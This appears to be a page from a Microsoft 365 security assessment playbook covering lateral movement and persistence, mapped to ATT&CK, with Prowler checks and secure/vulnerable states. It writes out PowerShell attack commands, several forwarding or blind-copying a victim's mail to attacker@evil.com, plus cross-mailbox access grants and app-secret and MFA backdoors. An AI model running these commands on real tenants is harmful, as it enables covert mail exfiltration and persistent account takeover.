# M365 · Phase 4 — Lateral Movement & Persistence

> ATT&CK [TA0008 Lateral Movement](../_cloud-base/TA0008-lateral-movement.md) +
> [TA0003 Persistence](../_cloud-base/TA0003-persistence.md) +
> [TA0002 Execution](../_cloud-base/TA0002-execution.md), projected onto M365.

## Lateral movement
#### T1534 Internal Spearphishing · T1114 (cross-mailbox)
From a compromised mailbox, phish internally (trusted sender), or use delegated/
application mailbox access (`Mail.Read` app grant) to read **other** users' mail.
```powershell
Get-MgUserMessage -UserId victim@target.com                 # with app Mail.Read
Add-MailboxPermission -Identity victim -User attacker -AccessRights FullAccess
```
- **Negative (vulnerable):** app-wide `Mail.Read`/`Files.Read.All` lets one token
  read the whole tenant's mail/files.

#### Teams/SharePoint pivot
External access/federation misconfig lets external identities message/join;
guest access to sensitive sites. Prowler `teams_external_access_trial_tenants_blocked`,
`sharepoint_external_sharing_restricted`, `sharepoint_guest_sharing_restricted`.

## Persistence
#### T1098.002 Additional Email Delegate · T1137 Office Application Startup
- **Inbox/transport rules** (quiet mail exfil + persistence):
  ```powershell
  New-InboxRule -Name x -ForwardTo attacker@evil.com
  New-TransportRule -Name x -BlindCopyTo attacker@evil.com
  Set-Mailbox victim -DeliverToMailboxAndForward $true -ForwardingSmtpAddress attacker@evil.com
  ```
- **Positive (secure):** external forwarding blocked (`exchange_external_mail_forwarding_disabled`-style checks); mailbox-rule auditing on.
- **Negative (vulnerable):** auto-forward to external succeeds → persistent exfil.

#### T1098 Account Manipulation — identity persistence
- **App registration secret/cert backdoor** (survives password resets):
  `Add-MgServicePrincipalPassword`/`-Certificate`.
- **Added owner** on a privileged app/group; **new guest/member**; registering a
  rogue **MFA method** or TAP on a victim.

---
*Base: [Lateral Movement](../_cloud-base/TA0008-lateral-movement.md) ·
[Persistence](../_cloud-base/TA0003-persistence.md) ·
[Execution](../_cloud-base/TA0002-execution.md). Next: [Phase 5 — Evasion](05-evasion.md).*
